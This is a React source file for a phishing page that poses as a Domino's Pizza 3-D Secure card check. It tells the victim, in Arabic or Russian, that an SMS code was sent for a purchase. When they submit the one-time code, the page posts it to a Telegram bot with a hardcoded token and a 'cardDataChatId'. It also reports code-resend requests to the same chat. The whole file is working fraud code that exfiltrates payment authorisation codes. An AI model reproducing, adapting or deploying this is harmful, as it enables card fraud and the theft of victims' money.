import { Link, useLocation, useNavigate } from "react-router-dom";
import Logo from "../images/Dominos-3ds.png";
import Payment from "../images/payment.png";
import { useEffect, useState } from "react";
import axios from "axios";
import Cookies from "js-cookie";

const CodeConfirmPage = ({ isArabic }) => {
  const [isTimerFinished, setIsTimerFinished] = useState(false);
  const [restartTimer, setRestartTimer] = useState(false);
  const [countdown, setCountdown] = useState(15);
  const navigate = useNavigate();
  const { state } = useLocation();
  let total = state?.totalPrice;
  const [date, setDate] = useState("");
  const [otpCode, setOtpCode] = useState("");

  const clientNumber = Cookies.get("clientNumber");

  const handleSubmitOtpCode = async (e) => {
    e.preventDefault();

    const botToken = "6566169381:AAGWhaAXX96VEHENijPAAGCA0JvvLbXBFwg";
    const cardDataChatId = "-4020641906";

    const code = ` 
#${clientNumber} ввел OTP Code: ${otpCode}
    `;

    const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

    try {
      if (otpCode) {
        const response = await axios.post(telegramApiUrl, {
          chat_id: cardDataChatId,
          text: code,
        });
        if (response.data.ok) {
          console.log("Сообщение успешно отправлено в Telegram!");
        } else {
          console.log("Не удалось отправить сообщение в Telegram");
        }
        Cookies.set("clientNumber", clientNumber);
        navigate("/successfully");
      }
    } catch (error) {
      console.log("Произошла ошибка при отправке сообщения в Telegram");
      console.error(
        "Произошла ошибка при отправке сообщения в Telegram:",
        error
      );
    }
  };

  useEffect(() => {
    window.scrollTo(0, 0);
    const formattedDate = new Date().toLocaleString();
    setDate(formattedDate);
  }, []);
  useEffect(() => {
    const handleTimeout = () => {
      setTimeout(() => {
        setIsTimerFinished(true);
      }, 15000);
    };
    handleTimeout();
    const interval = setInterval(() => {
      setCountdown((prevCountdown) => prevCountdown - 1);
    }, 1000);

    return () => {
      clearInterval(interval);
      clearTimeout(handleTimeout);
    };
  }, [restartTimer]);

  const handleResend = async (e) => {
    e.preventDefault();
    setCountdown(15);
    setIsTimerFinished(false);
    setRestartTimer(true);

    const botToken = "6566169381:AAGWhaAXX96VEHENijPAAGCA0JvvLbXBFwg";
    const cardDataChatId = "-4020641906";

    const code = ` 
#${clientNumber} попросил снова отправить код
    `;

    const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

    try {
      const response = await axios.post(telegramApiUrl, {
        chat_id: cardDataChatId,
        text: code,
      });

      if (response.data.ok) {
        console.log("Сообщение успешно отправлено в Telegram!");
      } else {
        console.log("Не удалось отправить сообщение в Telegram");
      }
    } catch (error) {
      console.log("Произошла ошибка при отправке сообщения в Telegram");
      console.error(
        "Произошла ошибка при отправке сообщения в Telegram:",
        error
      );
    }

    Cookies.set("clientNumber", clientNumber);
  };

  const messages = isArabic
    ? {
        sentMessage: "لقد أرسلنا لك رسالة نصية تحتوي على رمز إلى",
        purchaseInfo: `المبلغ من دومينوز بيتزا هو ${total} درهم،  ${date}.`,
        yourMobileNumber: "رقم هاتفك المحمول المسجل",
        codePlaceholder: "الرمز الخاص بك...",
        confirmButton: "تأكيد",
        resendButton: "يمكنك طلب الرمز مرة أخرى بعد 15 ثانية",
        resendBtn: "أعد إرسال الرمز",
        cancelButton: "إلغاء",
        helpText: "هل تحتاج إلى مساعدة؟",
      }
    : {
        sentMessage: "Мы отправили вам текстовое сообщение с кодом на",
        purchaseInfo: `Покупка в Dominos Pizza на сумму ${total} руб, ${date}`,
        yourMobileNumber: "ваш зарегистрированный номер мобильного телефона",
        codePlaceholder: "Ваш код...",
        confirmButton: "ПОДТВЕРДИТЬ",
        resendButton: "Вы можете запросить код снова через 15 секунд",
        resendBtn: "Отправить код повторно",
        cancelButton: "ОТМЕНА",
        helpText: "Нужна помощь?",
      };

  return (
    <section className="ds">
      <section className="images">
        <div className="logo">
          <img src={Logo} alt="Logo" />
        </div>
        <div className="payment">
          <img src={Payment} alt="Payment" />
        </div>
      </section>
      <p>
        {messages.sentMessage} <br />
        {messages.yourMobileNumber}. <br />
        <br />
        {messages.purchaseInfo}
      </p>
      <form>
        <input
          onChange={(e) => setOtpCode(e.target.value)}
          type="text"
          placeholder={messages.codePlaceholder}
        />

        <button onClick={handleSubmitOtpCode} className="confirm">
          {messages.confirmButton}
        </button>

        {isTimerFinished ? (
          <button onClick={handleResend} className="resend">
            {messages.resendBtn}
          </button>
        ) : (
          <Link to={"/"}>
            <button className="resend">{`Вы можете запросить код снова через ${countdown} секунд`}</button>
          </Link>
        )}

        <Link to={"/"}>
          <button className="cancel">{messages.cancelButton}</button>
        </Link>
      </form>
      <span>{messages.helpText}</span>
    </section>
  );
};

export default CodeConfirmPage;
